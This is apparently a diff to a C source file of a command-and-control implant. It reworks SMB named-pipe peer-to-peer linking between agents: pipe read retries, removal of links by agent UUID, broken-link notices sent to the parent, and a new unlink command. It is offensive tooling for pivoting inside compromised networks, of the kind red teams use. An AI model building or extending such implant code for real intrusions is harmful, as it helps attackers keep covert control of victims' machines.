@@ -10,7 +10,7 @@
 #ifdef INCLUDE_CMD_LINK
 
 /**
- * @brief Link current Beacon to an SMB Beacon.
+ * @brief Link current Agent to an SMB Agent.
  * 
  * @ref 
  * @return VOID
@@ -66,20 +66,6 @@ END:
     return;
 }
 
-///////////////////////////////////////////////////////////////
-
-/**
- * @brief UnLink current Beacon from an SMB Beacon.
- * 
- * @ref  
- * @return VOID
- */
-VOID UnLink(PCHAR taskUuid, PPARSER arguments)
-{
-    return;
-}
-
-
 /**
  *  Helper Functions
  */
@@ -116,10 +102,16 @@ BOOL LinkAdd( PCHAR TaskUuid, PCHAR PipeName, PVOID* outBuf, SIZE_T* outLen, UIN
 
 
     /* Read the initial buffer */
-    if ( !PackageReadPipe(hPipe, outBuf, outLen) )
+    while ( *outLen < sizeof( UINT32 ) )
     {
-        _err("Failed to read initial buffer from pipe. ERROR : %d", GetLastError());
-        return FALSE;
+        if ( !PackageReadPipe(hPipe, outBuf, outLen) )
+        {
+            _err("Failed to read initial buffer from pipe. ERROR : %d", GetLastError());
+            return FALSE;
+        }
+
+        /* Parent was faster than Link, wait for data */
+        Sleep(100);
     }
 
 
@@ -247,8 +239,18 @@ BOOL LinkSync( PCHAR TaskUuid, PPARSER Response )
             {
                 if ( GetLastError() == ERROR_BROKEN_PIPE )
                 {
-                    _err("Pipe is broken, removing Link ID [%x]...", Current->LinkId);
-                    LinkRemove(Current->LinkId);
+                    _err("Pipe is broken, removing P2P Agent %s...", Current->AgentId);
+                    LinkRemove(Current->AgentId);
+                    
+                    /* Send P2P Remove Msg */
+                    PPackage locals = PackageInit(NULL, FALSE);
+                    PackageAddByte(locals, LINK_REMOVE);
+                    PackageAddByte(locals, FALSE);                                             // BOOL:  IsFromTask?
+                    PackageAddBytes(locals, xenonConfig->agentID, TASK_UUID_SIZE, FALSE);      // PCHAR: Parent Agent UUID
+                    PackageAddBytes(locals, Current->AgentId, TASK_UUID_SIZE, FALSE);          // PCHAR: P2P Agent UUID
+                    
+                    PackageQueue(locals);
+
                     goto CLEANUP;
                 }
             }
@@ -316,7 +318,22 @@ VOID LinkPush()
                 /* Use PackageReadPipe to read entire package */
                 if ( !PackageReadPipe(TempList->hPipe, &Output, &OutLen) )
                 {
-                    // Something went wrong.
+                    if ( GetLastError() == ERROR_BROKEN_PIPE )
+                    {
+                        _err("Pipe is broken, removing P2P Agent %s...", TempList->AgentId);
+                        
+                        LinkRemove(TempList->AgentId);
+                        
+                        /* Send P2P Remove Msg */
+                        PPackage locals = PackageInit(NULL, FALSE);
+                        PackageAddByte(locals, LINK_REMOVE);
+                        PackageAddByte(locals, FALSE);                                              // BOOL:  IsFromTask?
+                        PackageAddBytes(locals, xenonConfig->agentID, TASK_UUID_SIZE, FALSE);       // PCHAR: Parent Agent UUID
+                        PackageAddBytes(locals, TempList->AgentId, TASK_UUID_SIZE, FALSE);          // PCHAR: P2P Agent UUID
+                        
+                        PackageQueue(locals);
+                    }
+                    
                     break;
                 }
 
@@ -390,10 +407,10 @@ UINT32 PivotParseLinkId( PVOID Buffer, SIZE_T Length )
 
 /**
  * @brief Remove a Link from the linked list
- * @param [in] LinkId The Link ID to remove
+ * @param [in] P2pUuid The P2P Agent UUID to remove
  * @return BOOL success or not
  */
-BOOL LinkRemove( UINT32 LinkId )
+BOOL LinkRemove( PCHAR P2pUuid )
 {
     PLINKS Current = xenonConfig->SmbLinks;
     PLINKS Prev    = NULL;
@@ -402,7 +419,7 @@ BOOL LinkRemove( UINT32 LinkId )
     {
         PLINKS Next = Current->Next;
 
-        if ( Current->LinkId == LinkId )
+        if ( strcmp(Current->AgentId, P2pUuid) == 0 )
         {
             if ( Current->hPipe ) CloseHandle(Current->hPipe);
             if ( Current->PipeName ) LocalFree(Current->PipeName);
@@ -427,3 +444,52 @@ BOOL LinkRemove( UINT32 LinkId )
 
 
 #endif  //INCLUDE_CMD_LINK
+
+///////////////////////////////////////////////////////////////
+
+
+#ifdef INCLUDE_CMD_UNLINK
+
+/**
+ * @brief UnLink current Agent from an SMB Agent.
+ * 
+ * @ref  
+ * @return VOID
+ */
+ VOID UnLink(PCHAR taskUuid, PPARSER arguments)
+ {
+    // Get command arguments for filepath
+    UINT32 nbArg = ParserGetInt32(arguments);
+    _dbg("\t Got %d arguments", nbArg);
+
+    if (nbArg == 0)
+    {
+        return;
+    }
+
+    PCHAR  Host      = NULL;
+    PCHAR  P2pUuid   = NULL;
+    SIZE_T hLen      = 0;
+    SIZE_T pLen      = 0;
+
+    // Host    = ParserGetString(arguments, &hLen);
+    P2pUuid = ParserGetString(arguments, &pLen);
+
+    _dbg("Unlinking P2P Agent [%s]", P2pUuid);
+
+    LinkRemove(P2pUuid);
+
+    /* Send P2P Remove Msg */
+    PPackage locals = PackageInit(NULL, FALSE);
+    PackageAddByte(locals, LINK_REMOVE);
+    PackageAddByte(locals, TRUE);                                              // BOOL:                IsFromTask?
+    PackageAddBytes(locals, taskUuid, TASK_UUID_SIZE, FALSE);                  // PCHAR:               Task UUID
+    PackageAddBytes(locals, xenonConfig->agentID, TASK_UUID_SIZE, FALSE);      // PCHAR:               Parent Agent UUID
+    PackageAddBytes(locals, P2pUuid, TASK_UUID_SIZE, FALSE);                   // PCHAR:               P2P Agent UUID
+    
+    PackageQueue(locals);
+
+    return;
+}
+
+#endif  //INCLUDE_CMD_UNLINK
